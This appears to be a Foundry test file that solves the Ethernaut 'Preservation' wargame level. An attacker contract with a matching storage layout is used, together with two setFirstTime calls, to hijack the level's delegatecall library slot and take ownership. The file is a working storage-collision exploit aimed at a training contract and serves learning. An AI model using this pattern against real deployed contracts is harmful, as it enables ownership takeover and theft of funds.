// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {EthernautTest} from "./utils/EthernautTest.sol";
import {PreservationFactory} from "../src/factories/PreservationFactory.sol";
import {Preservation} from "../src/levels/Preservation.sol";

import "forge-std/console.sol";

contract PreservationTest is EthernautTest {
    function setUp() public override {
        super.setUp();
        PreservationFactory factory = new PreservationFactory();
        ethernaut.registerLevel(factory);
        levelAddress = ethernaut.createLevelInstance(factory);
    }

    function testSolvePreservation() public {
        Preservation instance = Preservation(payable(levelAddress));

        // [START]

        console.log("[Before] owner: ", instance.owner());

        // 1. Deploy attacker contract
        PreservationAttack attacker = new PreservationAttack(
            payable(levelAddress)
        );

        instance.setFirstTime(uint256(uint160(address(attacker))));
        instance.setFirstTime(uint256(uint160(address(this))));

        console.log("[After] owner: ", instance.owner());
        // console.log("player: ", address(this));
        assertEq(instance.owner(), address(this));

        // [END]

        assert(ethernaut.submitLevelInstance(payable(levelAddress)));
    }
}

// Attacker contract
contract PreservationAttack {
    address public addr1;
    address public addr2;
    address public owner;
    Preservation public target;

    constructor(address _target) {
        target = Preservation(_target);
        addr1 = address(this);
    }

    function setTime(uint256 _time) external {
        owner = address(uint160(_time));
    }
}
